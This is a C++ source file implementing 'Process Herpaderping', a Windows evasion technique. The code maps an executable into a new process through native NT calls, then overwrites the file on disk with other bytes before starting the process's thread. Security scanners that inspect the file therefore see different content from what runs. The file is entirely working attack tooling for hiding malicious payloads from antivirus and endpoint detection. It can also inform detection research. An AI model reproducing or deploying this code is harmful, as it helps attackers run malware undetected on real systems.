#include "herpaderp.h"

HANDLE herpaderp::createProcessSection(HANDLE targetFile) {
    HANDLE sectionHandle;
    NTSTATUS status = NtCreateSection(&sectionHandle,
        SECTION_ALL_ACCESS,
        NULL,
        NULL,
        PAGE_READONLY,
        SEC_IMAGE,
        targetFile);

    if (!NT_SUCCESS(status))
        return NULL;
    else
        return sectionHandle;
}

HANDLE herpaderp::createProcessObject(HANDLE sectionHandle, HANDLE parentProcess) {
    HANDLE processHandle;
    NTSTATUS status = NtCreateProcessEx(&processHandle,
        PROCESS_ALL_ACCESS,
        NULL,
        GetCurrentProcess(),
        PROCESS_CREATE_FLAGS_INHERIT_HANDLES,
        sectionHandle,
        NULL,
        NULL,
        0);

    if (!NT_SUCCESS(status))
        return NULL;
    else
        return processHandle;
}


HANDLE herpaderp::createMainThread(HANDLE processHandle, PVOID entryPoint) {
    HANDLE threadHandle;
    NTSTATUS status = NtCreateThreadEx(&threadHandle,
        THREAD_ALL_ACCESS,
        NULL,
        processHandle,
        (PUSER_THREAD_START_ROUTINE)entryPoint,
        NULL,
        0,
        0,
        0,
        0,
        NULL);

    if (!NT_SUCCESS(status))
        return NULL;
    else
        return threadHandle;
}

PVOID herpaderp::readFile(HANDLE targetFile, DWORD& bufferSize) {
    DWORD fileSize = utils::getFileSize(targetFile);
    PVOID buffer = malloc(fileSize);

    BOOL success = ReadFile(
        targetFile,
        buffer,
        fileSize,
        NULL,
        NULL
    );

    if (!success)
        return NULL;

    bufferSize = fileSize;

    return buffer;
}

BOOL herpaderp::overwriteWithBuffer(HANDLE targetFile, PBYTE buffer, SIZE_T bufferSize) {

    BOOL success = SetFilePointer(
        targetFile,
        0,
        NULL,
        FILE_BEGIN

    );

    success = WriteFile(
        targetFile,
        (PVOID)buffer,
        bufferSize,
        NULL,
        NULL

    );

    success = FlushFileBuffers(targetFile);

    return success;
}
HerpaderpInfo herpaderp::herpaderp(LPCWSTR sourceFileName, LPCWSTR targetFileName, HANDLE parentProcess, PBYTE overwriteBuffer, SIZE_T overwriteBufferSize) {

    HANDLE targetFile = utils::copyFile(sourceFileName, targetFileName);

    HANDLE sectionHandle = herpaderp::createProcessSection(targetFile);

    HANDLE processHandle = herpaderp::createProcessObject(sectionHandle, NtCurrentProcess);

    auto epRva = utils::getEntryPointRva(targetFile);
    auto processPeb = utils::readRemotePeb(processHandle);

    auto routine = (PVOID)((ULONG_PTR)processPeb.ImageBaseAddress + epRva);

    auto imagePathName = std::wstring(targetFileName);
    auto cmdLine = L"\"" + std::wstring(targetFileName) + L"\"";
    
    auto params = utils::initProcessParameters(
        imagePathName,
        cmdLine
    );

    utils::writeRemoteProcessParameters(processHandle, params);
    herpaderp::overwriteWithBuffer(targetFile, overwriteBuffer, overwriteBufferSize);

    HANDLE threadHandle = herpaderp::createMainThread(processHandle, routine);

    return HerpaderpInfo{
        sectionHandle,
        processHandle,
        threadHandle,
    };
}

BOOL herpaderp::succeeded(HerpaderpInfo& info) {
    return (info.section) && (info.process) && (info.thread);
}